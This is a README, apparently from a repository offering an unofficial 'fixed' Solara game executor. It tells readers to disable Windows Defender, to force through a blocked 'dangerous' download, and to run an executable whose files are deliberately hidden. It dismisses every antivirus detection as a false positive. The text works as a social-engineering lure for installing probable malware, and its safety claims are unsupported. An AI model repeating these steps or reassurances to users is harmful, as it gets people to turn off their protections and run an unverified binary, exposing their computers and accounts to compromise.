# DOWNLOAD TUTORIAL:
1. (JUST INCASE ANY RETARDS SEE THIS) Disable Windows Defender.
2. If you see code, click on it and press "Download Zip".
3. If your browser declines the download, press Ctrl + H, and click "Allow Dangerous File" (probably not the name but whatever) (ITS NOT DANGEROUS, ALL EXECUTORS ARE FALSE POSITIVE, BE SMART.)
4. Click solara-main, Files, and run the "Built" Application/EXE. (I CANNOT RENAME SINCE ITS DEPENDENT ON THE FIX, I WILL LOOK INTO IT FURTHER.)



# THIS IS NOT THE OFFICAL SOLARA: UPDATES WILL NOT BE INSTANTLY ADDED BUT I WILL TRY MY BEST.

The reason i made this fix is because Solara has vulnerabilites in its code and im here to fix them. People can create scripts and use them to rat your pc when you use Solara (blame qui) so i made this fix, its the most recent version. Just run the "Builder" (had to rename it for the code to work) and it'll download the fixed Solara. (Files hidden so skids cant find a bypass.)


# If it shows up as a virus, disable Windows Defender. It's >**SOLARA**<, obviously it will show up as a false positive if Solara does itself.
